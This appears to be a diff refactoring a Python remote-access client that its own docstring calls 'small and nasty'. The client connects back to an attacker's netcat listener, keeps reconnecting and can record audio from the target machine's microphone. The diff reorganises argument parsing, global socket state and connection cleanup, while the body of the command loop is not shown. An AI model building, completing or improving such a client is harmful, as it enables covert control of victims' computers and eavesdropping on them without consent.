@@ -8,11 +8,10 @@ Small and nasty.
 
 Update: It now has a function that allows recording audio from the target
 machine's microphone.
-"""
-
 
 # put netcat in mode listener, to test
 # nc -l -v -p <port_to_connect>
+"""
 
 import signal
 import subprocess
@@ -21,16 +20,12 @@ from socket import *
 
 from escuta import escuta
 
-if (len(sys.argv) == 3):
-    host = sys.argv[1]
-    port = int(sys.argv[2])
-else:
-    sys.exit("Example: python client.py <server ip> <server port>")
+s = None
+connected = False
 
-
-# Used to make sure a subprocess lasts 30 seconds max
 
 class Alarm(Exception):
+    """Used to make sure a subprocess lasts 30 seconds max"""
     pass
 
 
@@ -39,6 +34,8 @@ def alarm_handler(signum, frame):
 
 
 def main(host, port):
+    global s
+    global connected
     while True:
         connected = False
         while True:
@@ -107,11 +104,19 @@ def main(host, port):
                 break
 
 
-while True:
+if __name__ == "__main__":
+    if len(sys.argv) == 3:
+        host = sys.argv[1]
+        port = int(sys.argv[2])
+    else:
+        sys.exit("Example: python client.py <server ip> <server port>")
 
-    try:
-        main(host, port)
-        escuta()
-        time()
-    except KeyboardInterrupt:
-        s.close()
+    while True:
+        try:
+            main(host, port)
+            escuta()
+            time()
+        except KeyboardInterrupt:
+            # Close connection, if exists
+            if connected:
+                s.close()
